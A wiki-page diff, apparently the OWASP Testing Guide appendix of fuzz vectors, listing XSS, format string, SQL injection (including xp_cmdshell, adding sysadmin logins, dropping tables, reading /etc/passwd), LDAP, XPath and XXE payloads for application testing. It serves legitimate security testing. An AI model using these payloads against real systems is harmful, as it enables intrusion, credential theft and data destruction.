@@ -1,0 +1,281 @@
+{{Template:OWASP Testing Guide v3}}
+
+
+The following are fuzzing vectors which can be used with [[WebScarab]], [[JBroFuzz]], [[WSFuzzer]], or another fuzzer.
+Fuzzing is the "kitchen sink" approach to testing the response of an application to parameter manipulation. Generally one looks for error conditions that are generated in an application as a result of fuzzing.
+This is the simple part of the discovery phase.
+Once an error has been discovered identifying and exploiting a potential vulnerability is where skill is required.
+
+=== Fuzz Categories ===
+
+In the case of stateless network protocol fuzzing (like HTTP(S)) two broad categories exist:
+
+* Recursive fuzzing
+* Replacive fuzzing
+
+We examine and define each category in the sub-sections that follow. 
+
+==== Recursive fuzzing ====
+
+Recursive fuzzing can be defined as the process of fuzzing a part of a request by iterating through all the possible combinations of a set alphabet. Consider the case of:
+
+<pre>
+<nowiki>http://www.example.com/8302fa3b</nowiki>
+</pre>
+
+Selecting "8302fa3b" as a part of the request to be fuzzed against the set hexadecimal alphabet i.e. {0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f} falls under the category of recursive fuzzing. This would generate a total of 16^8 requests of the form:
+<pre>
+<nowiki>http://www.example.com/00000000</nowiki>
+<nowiki>...</nowiki>
+<nowiki>http://www.example.com/11000fff</nowiki>
+<nowiki>...</nowiki>
+<nowiki>http://www.example.com/ffffffff</nowiki>
+</pre>
+
+==== Replacive fuzzing ====
+
+Replacive fuzzing can be defined as the process of fuzzing part of a request by means of replacing it with a set value. This value is known as a fuzz vector. In the case of:
+
+<pre>
+<nowiki>http://www.example.com/8302fa3b</nowiki>
+</pre>
+
+Testing against Cross Site Scripting (XSS) by sending the following fuzz vectors: 
+
+<pre>
+<nowiki>http://www.example.com/>"><script>alert("XSS")</script>&</nowiki>
+<nowiki>http://www.example.com/'';!--"<XSS>=&{()}</nowiki>
+</pre>
+
+This is a form of replacive fuzzing. In this category, the total number of requests is dependant on the number of fuzz vectors specified. 
+
+The remainder of this appendix presents a number of fuzz vector categories.
+
+=== Cross Site Scripting (XSS) ===
+
+For details on XSS: [[Cross-site Scripting (XSS)]]
+
+ <nowiki>>"><script>alert("XSS")</script>&</nowiki>
+ <nowiki>"><STYLE>@import"javascript:alert('XSS')";</STYLE></nowiki>
+ <nowiki>>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;
+ alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)></nowiki><br>
+ <nowiki>>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22></nowiki>
+ <nowiki>'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'</nowiki>
+ <nowiki>"></nowiki>
+ <nowiki>>"</nowiki>
+ <nowiki>'';!--"<XSS>=&{()}</nowiki>
+ <nowiki><IMG SRC="javascript:alert('XSS');"></nowiki>
+ <nowiki><IMG SRC=javascript:alert('XSS')></nowiki>
+ <nowiki><IMG SRC=JaVaScRiPt:alert('XSS')> </nowiki>
+ <nowiki><IMG SRC=JaVaScRiPt:alert(&amp;quot;XSS<WBR>&amp;quot;)></nowiki>
+ <nowiki><IMGSRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;<WBR>#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;<WBR>#116;&amp;#58;&amp;#97;
+ &amp;#108;&amp;#101;&amp;<WBR>#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83<WBR>;&amp;#83;&amp;#39;&amp;#41></nowiki>
+ <nowiki><IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058
+ &<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041></nowiki><br>           
+ <nowiki><IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28
+ &<WBR>#x27&#x58&#x53&#x53&#x27&#x29></nowiki><br>
+ <nowiki><IMG SRC="jav&amp;#x09;ascript:alert(<WBR>'XSS');"></nowiki>
+ <nowiki><IMG SRC="jav&amp;#x0A;ascript:alert(<WBR>'XSS');"></nowiki>
+ <nowiki><IMG SRC="jav&amp;#x0D;ascript:alert(<WBR>'XSS');"></nowiki>
+
+=== Buffer Overflows and Format String Errors ===
+
+==== Buffer Overflows (BFO) ====
+A buffer overflow or memory corruption attack is a programming condition which allows overflowing of valid data beyond its prelocated storage limit in memory.
+
+For details on Buffer Overflows: [[Testing for Buffer Overflow (OWASP-DV-014) | Testing for Buffer Overflow ]]
+
+Note that attempting to load such a definition file within a fuzzer application can potentially cause the application to crash.
+
+ <nowiki>A x 5</nowiki>
+ <nowiki>A x 17</nowiki>
+ <nowiki>A x 33</nowiki>
+ <nowiki>A x 65</nowiki>
+ <nowiki>A x 129</nowiki>
+ <nowiki>A x 257</nowiki>
+ <nowiki>A x 513</nowiki>
+ <nowiki>A x 1024</nowiki>
+ <nowiki>A x 2049</nowiki>
+ <nowiki>A x 4097</nowiki>
+ <nowiki>A x 8193</nowiki>
+ <nowiki>A x 12288</nowiki>
+
+==== Format String Errors (FSE) ====
+
+Format string attacks are a class of vulnerabilities which involve supplying language specific format tokens in order to execute arbitrary code or crash a program. Fuzzing for such errors has as an objective to check for unfiltered user input.
+
+An excellent introduction on FSE can be found in the USENIX paper entitled: [http://www.usenix.net/publications/library/proceedings/sec01/full_papers/shankar/shankar_html/index.html Detecting Format String Vulnerabilities with Type Qualifiers]
+
+Note that attempting to load such a definition file within a fuzzer application can potentially cause the application to crash.
+
+ <nowiki>%s%p%x%d</nowiki>
+ <nowiki>.1024d</nowiki>
+ <nowiki>%.2049d</nowiki>
+ <nowiki>%p%p%p%p</nowiki>
+ <nowiki>%x%x%x%x</nowiki>
+ <nowiki>%d%d%d%d</nowiki>
+ <nowiki>%s%s%s%s</nowiki>
+ <nowiki>%99999999999s</nowiki>
+ <nowiki>%08x</nowiki>
+ <nowiki>%%20d</nowiki>
+ <nowiki>%%20n</nowiki>
+ <nowiki>%%20x</nowiki>
+ <nowiki>%%20s</nowiki>
+ <nowiki>%s%s%s%s%s%s%s%s%s%s</nowiki>
+ <nowiki>%p%p%p%p%p%p%p%p%p%p</nowiki>
+ <nowiki>%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%</nowiki>
+ <nowiki>%s x 129</nowiki>
+ <nowiki>%x x 257</nowiki>
+
+==== Integer Overflows (INT) ====
+
+Integer overflow errors occur when a program fails to account for the fact that an arithmetic operation can result in a quantity either greater than a data type's maximum value or less than its minimum value. If a tester can cause the program to perform such a memory allocation, the program can be potentially vulnerable to a buffer overflow attack.
+
+ <nowiki>-1</nowiki>
+ <nowiki>0</nowiki>
+ <nowiki>0x100</nowiki>
+ <nowiki>0x1000</nowiki>
+ <nowiki>0x3fffffff</nowiki>
+ <nowiki>0x7ffffffe</nowiki>
+ <nowiki>0x7fffffff</nowiki>
+ <nowiki>0x80000000</nowiki>
+ <nowiki>0xfffffffe</nowiki>
+ <nowiki>0xffffffff</nowiki>
+ <nowiki>0x10000</nowiki>
+ <nowiki>0x100000</nowiki>
+
+=== SQL Injection ===
+
+This attack can affect the database layer of an application and is typically present when user input is not filtered for SQL statements.
+
+For details on Testing SQL Injection: [[Testing for SQL Injection (OWASP-DV-005)|Testing for SQL Injection]]
+
+SQL Injection is classified in the following two categories, depending on the exposure of database information (passive) or the alteration of database information (active).
+
+* Passive SQL Injection
+* Active SQL Injection
+
+Active SQL Injection statements can have a detrimental effect on the underllying database if successfully executed.
+
+==== Passive SQL Injection (SQP) ====
+
+ <nowiki>'||(elt(-3+5,bin(15),ord(10),hex(char(45))))</nowiki>
+ <nowiki>||6</nowiki>
+ <nowiki>'||'6</nowiki>
+ <nowiki>(||6)</nowiki>
+ <nowiki>' OR 1=1--</nowiki> 
+ <nowiki>OR 1=1</nowiki>
+ <nowiki>' OR '1'='1</nowiki>
+ <nowiki>; OR '1'='1'</nowiki>
+ <nowiki>%22+or+isnull%281%2F0%29+%2F*</nowiki>
+ <nowiki>%27+OR+%277659%27%3D%277659</nowiki>
+ <nowiki>%22+or+isnull%281%2F0%29+%2F*</nowiki>
+ <nowiki>%27+--+</nowiki>
+ <nowiki>' or 1=1--</nowiki>
+ <nowiki>" or 1=1--</nowiki>
+ <nowiki>' or 1=1 /*</nowiki>
+ <nowiki>or 1=1--</nowiki>
+ <nowiki>' or 'a'='a</nowiki>
+ <nowiki>" or "a"="a</nowiki>
+ <nowiki>') or ('a'='a</nowiki>
+ <nowiki>Admin' OR '</nowiki>
+ <nowiki>'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--</nowiki>
+ <nowiki>) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;</nowiki>
+ <nowiki>' having 1=1--</nowiki>
+ <nowiki>' having 1=1--</nowiki>
+ <nowiki>' group by userid having 1=1--</nowiki>
+ <nowiki>' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--</nowiki>
+ <nowiki>' or 1 in (select @@version)--</nowiki>
+ <nowiki>' union all select @@version--</nowiki>
+ <nowiki>' OR 'unusual' = 'unusual'</nowiki>
+ <nowiki>' OR 'something' = 'some'+'thing'</nowiki>
+ <nowiki>' OR 'text' = N'text'</nowiki>
+ <nowiki>' OR 'something' like 'some%'</nowiki>
+ <nowiki>' OR 2 > 1</nowiki>
+ <nowiki>' OR 'text' > 't'</nowiki>
+ <nowiki>' OR 'whatever' in ('whatever')</nowiki>
+ <nowiki>' OR 2 BETWEEN 1 and 3</nowiki>
+ <nowiki>' or username like char(37);</nowiki>
+ <nowiki>' union select * from users where login = char(114,111,111,116);</nowiki>
+ <nowiki>' union select </nowiki>
+ <nowiki>Password:*/=1--</nowiki>
+ <nowiki>UNI/**/ON SEL/**/ECT</nowiki>
+ <nowiki>'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'</nowiki>
+ <nowiki>'; EXEC ('SEL' + 'ECT US' + 'ER')</nowiki>
+ <nowiki>'/**/OR/**/1/**/=/**/1</nowiki>
+ <nowiki>' or 1/*</nowiki>
+ <nowiki>+or+isnull%281%2F0%29+%2F*</nowiki>
+ <nowiki>%27+OR+%277659%27%3D%277659</nowiki>
+ <nowiki>%22+or+isnull%281%2F0%29+%2F*</nowiki>
+ <nowiki>%27+--+&password=</nowiki>
+ <nowiki>'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+ @var select @var as var into temp end --</nowiki><br>
+ <nowiki>' and 1 in (select var from temp)--</nowiki>
+ <nowiki>' union select 1,load_file('/etc/passwd'),1,1,1;</nowiki>
+ <nowiki>1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;</nowiki>
+ <nowiki>' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));</nowiki>
+
+==== Active SQL Injection (SQI) ====
+
+ <nowiki>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</nowiki>
+ <nowiki>CREATE USER name IDENTIFIED BY 'pass123'</nowiki>
+ <nowiki>CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; </nowiki>
+ <nowiki>' ; drop table temp --</nowiki>
+ <nowiki>exec sp_addlogin 'name' , 'password'</nowiki>
+ <nowiki>exec sp_addsrvrolemember 'name' , 'sysadmin'</nowiki>
+ <nowiki>INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))</nowiki>
+ <nowiki>GRANT CONNECT TO name; GRANT RESOURCE TO name;</nowiki>
+ <nowiki>INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) 
+ + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)</nowiki>
+
+=== LDAP Injection ===
+
+For details on LDAP Injection: [[Testing for LDAP Injection (OWASP-DV-006)|Testing for LDAP Injection]]
+
+ <nowiki>|</nowiki>
+ <nowiki>!</nowiki>
+ <nowiki>(</nowiki>
+ <nowiki>)</nowiki>
+ <nowiki>%28</nowiki>
+ <nowiki>%29</nowiki>
+ <nowiki>&</nowiki>
+ <nowiki>%26</nowiki>
+ <nowiki>%21</nowiki>
+ <nowiki>%7C</nowiki>
+ <nowiki>*|</nowiki>
+ <nowiki>%2A%7C</nowiki>
+ <nowiki>*(|(mail=*))</nowiki>
+ <nowiki>%2A%28%7C%28mail%3D%2A%29%29</nowiki>
+ <nowiki>*(|(objectclass=*))</nowiki>
+ <nowiki>%2A%28%7C%28objectclass%3D%2A%29%29</nowiki>
+ <nowiki>*()|%26'</nowiki>
+ <nowiki>admin*</nowiki>
+ <nowiki>admin*)((|userPassword=*)</nowiki>
+ <nowiki>*)(uid=*))(|(uid=*</nowiki>
+
+=== XPATH Injection ===
+
+For details on XPATH Injection: [[Testing for XPath Injection (OWASP-DV-010)|Testing for XPath Injection]]
+
+ <nowiki>'+or+'1'='1</nowiki>
+ <nowiki>'+or+''='</nowiki>
+ <nowiki>x'+or+1=1+or+'x'='y</nowiki>
+ <nowiki>/</nowiki>
+ <nowiki>//</nowiki>
+ <nowiki>//*</nowiki>
+ <nowiki>*/*</nowiki>
+ <nowiki>@*</nowiki>
+ <nowiki>count(/child::node())</nowiki>
+ <nowiki>x'+or+name()='username'+or+'x'='y</nowiki>
+
+=== XML Injection ===
+
+Details on XML Injection here: [[Testing for XML Injection  (OWASP-DV-008)|Testing for XML Injection]]
+
+ <nowiki><![CDATA[<script>var n=0;while(true){n++;}</script>]]></nowiki>
+ <nowiki><?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo></nowiki>
+ <nowiki><?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof></nowiki>
+ <nowiki><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo></nowiki>
+ <nowiki><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo></nowiki>
+ <nowiki><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo></nowiki>
+ <nowiki><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo></nowiki>
